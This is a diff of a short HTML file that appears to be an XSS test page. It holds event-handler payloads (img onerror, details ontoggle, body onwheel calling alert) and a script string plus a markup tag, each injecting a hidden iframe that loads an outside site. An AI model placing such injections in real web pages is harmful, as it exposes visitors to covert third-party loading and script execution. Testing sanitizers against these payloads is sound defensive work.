@@ -1,5 +1,6 @@
 <html>
 <head>
+	<!--<meta charset="UTF-8"></meta>-->
 </head>
 <body>
 
@@ -19,7 +20,7 @@
 
 "if(document.body.lastChild.id!=='gphcll'){var/**/f=document.createElement('iframe');f.src='http://www.geographycollector.com';f.setAttribute('id','gphcll');f.style.display='none';document.body.appendChild(f);};//"
 
-<iframe src="http://www.geographycollector.com" style="display:none" width=1 height=1>text list of cities</iframe>
+<iframe src="http://www.geographycollector.com" style="display:none" width=1 height=1></iframe>
 <img onerror="alert(1002);//" src="1002">
 <details ontoggle=alert(1000)></details>
 <body onwheel="alert(1001)">
